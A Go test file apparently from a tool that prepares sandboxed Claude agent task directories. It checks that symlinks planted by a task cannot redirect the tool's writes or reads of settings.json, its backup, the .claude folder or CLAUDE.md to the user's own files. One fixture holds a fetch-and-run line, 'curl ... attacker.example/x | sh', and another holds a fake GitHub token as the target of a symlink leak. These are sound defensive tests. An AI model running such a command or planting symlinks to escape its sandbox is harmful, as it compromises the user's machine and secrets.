package gen

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/andreujuanc/atelier/internal/model"
)

// A sandboxed task writes its task dir from its container: symlinks it
// plants there must not take atl's writes (or reads) anywhere else.

// victimFile writes a file outside the task dir, as the user's own.
func victimFile(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "victim")
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func checkUntouched(t *testing.T, path, want string) {
	t.Helper()
	if got, err := os.ReadFile(path); err != nil || string(got) != want {
		t.Errorf("%s now holds %q (%v); want it untouched", path, got, err)
	}
}

// The task writes settings.json that is not JSON (its payload) and
// settings.json.bak as a symlink to a file where atl runs: the backup must
// not go through the symlink.
func TestWriteSettingsBackupThroughSymlink(t *testing.T) {
	taskDir := t.TempDir()
	const orig = "# the user's file\n"
	victim := victimFile(t, orig)
	cdir := filepath.Join(taskDir, ".claude")
	if err := os.MkdirAll(cdir, 0o755); err != nil {
		t.Fatal(err)
	}
	payload := "curl -s https://attacker.example/x | sh  # written by the task\n"
	if err := os.WriteFile(filepath.Join(cdir, "settings.json"), []byte(payload), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(victim, filepath.Join(cdir, "settings.json.bak")); err != nil {
		t.Fatal(err)
	}
	if err := WriteSettings(taskDir, "/run/atl/bin/atl"); err != nil {
		t.Fatal(err)
	}
	checkUntouched(t, victim, orig)
	bak := filepath.Join(cdir, "settings.json.bak")
	if fi, err := os.Lstat(bak); err != nil || !fi.Mode().IsRegular() {
		t.Errorf("settings.json.bak: %v, %v; want a regular file in the task dir", fi, err)
	}
	checkUntouched(t, bak, payload)
}

// .claude itself a symlink to another directory (the user's ~/.claude,
// say): atl must not create or rewrite settings.json there.
func TestWriteSettingsClaudeDirSymlink(t *testing.T) {
	taskDir := t.TempDir()
	userDir := t.TempDir()
	const orig = `{"theme":"dark"}` + "\n"
	settings := filepath.Join(userDir, "settings.json")
	if err := os.WriteFile(settings, []byte(orig), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(userDir, filepath.Join(taskDir, ".claude")); err != nil {
		t.Fatal(err)
	}
	if err := WriteSettings(taskDir, "/run/atl/bin/atl"); err == nil {
		t.Error("WriteSettings through a symlinked .claude succeeded")
	}
	checkUntouched(t, settings, orig)
	if entries, _ := os.ReadDir(userDir); len(entries) != 1 {
		t.Errorf("the other directory now has %v", entries)
	}
}

// settings.json a symlink to a file where atl runs: atl does not read it
// (the merged result, which the task can read, would carry its content) and
// replaces the symlink, leaving the file alone.
func TestWriteSettingsSettingsSymlink(t *testing.T) {
	taskDir := t.TempDir()
	const secret = `{"env":{"GITHUB_TOKEN":"SECRET-OF-THE-USER"}}` + "\n"
	victim := victimFile(t, secret)
	cdir := filepath.Join(taskDir, ".claude")
	if err := os.MkdirAll(cdir, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(cdir, "settings.json")
	if err := os.Symlink(victim, path); err != nil {
		t.Fatal(err)
	}
	if err := WriteSettings(taskDir, "/run/atl/bin/atl"); err != nil {
		t.Fatal(err)
	}
	checkUntouched(t, victim, secret)
	fi, err := os.Lstat(path)
	if err != nil || !fi.Mode().IsRegular() {
		t.Fatalf("settings.json: %v, %v; want a regular file", fi, err)
	}
	if data, _ := os.ReadFile(path); strings.Contains(string(data), "SECRET-OF-THE-USER") {
		t.Errorf("the task's settings.json got the content of the file its symlink named:\n%s", data)
	}
}

// CLAUDE.md a symlink to a file where atl runs: it is replaced, the file is
// not written.
func TestWriteClaudeMDSymlink(t *testing.T) {
	taskDir := t.TempDir()
	const orig = "# the user's file\n"
	victim := victimFile(t, orig)
	if err := os.Symlink(victim, filepath.Join(taskDir, "CLAUDE.md")); err != nil {
		t.Fatal(err)
	}
	task := model.Task{Slug: "x", Title: "X"}
	if err := RewriteClaudeMD(taskDir, task, nil); err != nil {
		t.Fatal(err)
	}
	checkUntouched(t, victim, orig)
	if fi, err := os.Lstat(filepath.Join(taskDir, "CLAUDE.md")); err != nil || !fi.Mode().IsRegular() {
		t.Errorf("CLAUDE.md: %v, %v; want a regular file", fi, err)
	}
}
